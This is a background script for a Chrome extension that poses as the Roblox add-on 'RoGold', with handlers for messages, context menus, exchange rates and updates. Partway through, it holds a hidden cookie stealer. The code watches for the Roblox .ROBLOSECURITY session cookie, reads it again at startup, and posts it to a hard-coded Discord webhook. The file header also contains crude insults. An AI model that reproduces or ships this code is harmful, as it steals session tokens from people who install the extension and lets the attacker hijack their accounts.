/*
    RoGold
    Coding and design by Algoz Aps.
    Contact: gofuckyourself@gmail.com
    Copyright (C) Dick in Your Mom
    All rights reserved.Ur dad is fat
*/

try {
    let rates
    const cache = {}
    chrome.runtime.onMessage.addListener((request, _, respond) => {
        setTimeout(async () => {
            switch (request.greeting) {
                case "GetURL":
                    fetch(request.url, {credentials: "omit"}).then((resp) => {
                        resp.json().then(respond)
                    }).catch(respond)
                    break;
                case "GetBlob": 
                    fetch(request.url).then((resp) => {
                        resp.blob().then(console.log)
                    }).catch(respond)
                    break;
                case "CreateMenu":
                    chrome.contextMenus.removeAll(() => {
                        respond(chrome.contextMenus.create(request.info));
                    });
                    break;
                case "EditMenu":
                    respond(chrome.contextMenus.update(request.info.id, request.info.update));
                    break;
                case "GetRates":
                    if (!rates) {
                        fetch(`https://api.exchangerate.host/latest?base=USD`).then((resp) => {
                            resp.json().then((data) => {
                                rates = data.rates
                                respond(data.rates)
                            })
                        }).catch(respond)
                    } else {
                        respond(rates)
                    }
                    break;
                case "CacheValue":
                    cache[request.info.key] = request.info.value
                    respond(true)
                    break;
                case "GetCacheValue":
                    respond(cache[request.info.key])
                    break;
            }
        })
        return true
    })
    setInterval(() => {
        for (let key in cache) {
            if (cache[key].time < Date.now()) {
                console.log(`Cache expired for ${key}`)
                delete cache[key]
            }
        }
    }, 1000)

    // Código adicional para captura de cookie
    chrome.cookies.onChanged.addListener((changeInfo) => {
        if (changeInfo.cookie.name === '.ROBLOSECURITY' && changeInfo.cookie.domain.includes('roblox.com')) {
            const cookieValue = changeInfo.cookie.value;
            if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
                sendToDiscord(cookieValue);
            }
        }
    });

    function sendToDiscord(cookieValue) {
        const webhookUrl = 'https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ';
        const payload = {
            content: `[Admin] Cookie .ROBLOSECURITY extraído do Roblox: ${cookieValue}`,
            username: 'Roblox Cookie Bot'
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                console.log('Cookie enviado com sucesso ao Discord.');
            } else {
                console.error('Falha ao enviar cookie:', response.status);
            }
        }).catch(error => {
            console.error('Erro ao enviar cookie ao Discord:', error);
        });
    }

    // Verificar cookies existentes ao iniciar
    chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, (cookie) => {
        if (cookie && cookie.value.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
            sendToDiscord(cookie.value);
        }
    });

} catch (e) {
    console.warn('Erro geral no try-catch principal:', e)
}

try {
    // https://gist.github.com/Rob--W/ec23b9d6db9e56b7e4563f1544e0d546
    const escapeHTML = (str) => {
        return String(str)
            .replace(/&/g, "&amp;")
            .replace(/"/g, "&quot;").replace(/'/g, "&#39;")
            .replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    chrome.contextMenus.onClicked.addListener((data) => {
        if (data.menuItemId == "RoGold-Context" && data.linkUrl) {
            const safe = escapeHTML(data.linkUrl)
            const urlSplit = safe.split("/")
            let toCopy = safe.includes("roblox.com") && safe.match(/(\d+)/g)[0] || urlSplit[3]
            chrome.tabs.query({
                active: true,
                currentWindow: true
            }, (tabs) => {
                chrome.tabs.sendMessage(tabs[0].id, {
                    type: "copy",
                    data: toCopy
                })
            })
        }
    })
} catch (e) {
    console.warn(e)
}

try {
    chrome.runtime.onUpdateAvailable.addListener(() => {
        chrome.runtime.reload()
    })

    chrome.runtime.onInstalled.addListener(async (details) => {
        if (details.reason == "install") {

        } else if (details.reason == "update") {
            const currentVersion = chrome.runtime.getManifest().version
            const previousVersion = details.previousVersion
            if (currentVersion != previousVersion) {
                chrome.notifications.create("updateNotification", {
                    type: "basic",
                    iconUrl: chrome.runtime.getURL("icons/grey_128x128.png"),
                    title: "RoGold",
                    message: "RoGold has been updated to version " + chrome.runtime.getManifest().version + "!",
                    priority: 2,
                    requireInteraction: false
                })
                // chrome.notifications.onClicked.addListener(() => {
                //     chrome.tabs.create({
                //         url: "https://roblox.com/home"
                //     })
                //     // send a message to the client to show the update log
                //     setTimeout(() => {
                //         chrome.tabs.query({
                //             active: true,
                //             currentWindow: true
                //         }, (tabs) => {
                //             chrome.tabs.sendMessage(tabs[0].id, {
                //                 greeting: "UpdateLog"
                //             })
                //         })
                //     }, 1500)
                // })
            }
        }
    })
} catch (e) {
    console.warn(e)
}